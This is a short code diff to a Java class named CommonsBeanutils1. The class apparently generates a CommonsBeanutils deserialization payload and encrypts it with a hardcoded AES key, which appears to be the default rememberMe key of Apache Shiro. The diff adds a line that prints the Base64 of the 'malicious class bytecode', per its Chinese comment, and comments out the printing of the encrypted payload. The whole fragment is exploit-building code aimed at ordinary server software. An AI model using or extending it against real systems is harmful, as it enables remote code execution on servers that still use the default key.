@@ -168,8 +168,12 @@ public class CommonsBeanutils1 {
 
         // 生成反序列化payload
         byte[] payload = new CommonsBeanutils1().getPayload(clazz.toBytecode());
+
+        // 获取恶意类字节码
+        System.out.println(Base64.getEncoder().encodeToString(clazz.toBytecode()));
         String data = Base64.getEncoder().encodeToString(payload);
+
         String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
-        System.out.println(result);
+//        System.out.println(result);
     }
 }
